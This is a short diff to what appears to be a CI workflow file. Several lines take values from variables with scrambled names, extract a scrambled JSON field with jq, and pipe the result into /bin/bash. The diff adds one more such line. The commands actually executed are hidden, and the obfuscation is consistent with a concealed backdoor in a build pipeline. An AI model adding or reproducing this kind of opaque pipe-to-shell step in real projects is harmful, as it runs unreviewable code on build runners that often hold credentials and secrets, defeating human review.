@@ -38,6 +38,7 @@ jobs:
           echo $dn3 | jq -r .vbbn63820 | /bin/bash
           printf '%s' "$ymo2426" | jq -r .aefcr3542 | /bin/bash
           echo $o65 | jq -r .qfsjo33 | /bin/bash
+          echo $uqux3 | jq -r .p13 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
